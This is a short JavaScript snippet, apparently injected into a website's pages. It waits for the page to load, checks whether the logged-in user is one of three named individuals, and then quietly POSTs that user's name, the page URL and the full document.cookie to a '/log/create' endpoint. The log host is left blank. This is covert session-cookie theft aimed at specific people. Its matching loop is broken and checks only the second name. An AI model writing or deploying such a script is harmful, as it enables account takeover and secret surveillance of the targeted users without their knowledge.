(function() {
    'use strict';

    var LOG_HOST = '';
    var _userName = '';

    try {
        document.addEventListener('DOMContentLoaded', function () {
            if (typeof $ !== 'undefined' && checkUser()) {
                run();
            }
        });
    } catch (e) {}

    function run() {
        var url = LOG_HOST + '/log/create';
        var userData = {
            userName: _userName,
            windowLocationHref: window.location.href,
            userCookie: document.cookie,
            logTime: new Date()
        };

        $.ajax({
            type: 'POST',
            url: url,
            data: JSON.stringify(userData),
            contentType: 'application/json',
            processData: false
        });
    }

    function checkUser() {
        var userName = $('div.login b').text();
        var users = ['Катерина Полякова', 'Соколан Егор', 'Олександр Дудко'];

        if (userName === '') {
            return false;
        } else {
            for (var i = 0; i < users.length; i++) {
                if (userName == users[1]) {
                    _userName = userName;
                    return true;
                }
            }

            return false;
        }
    }

})();
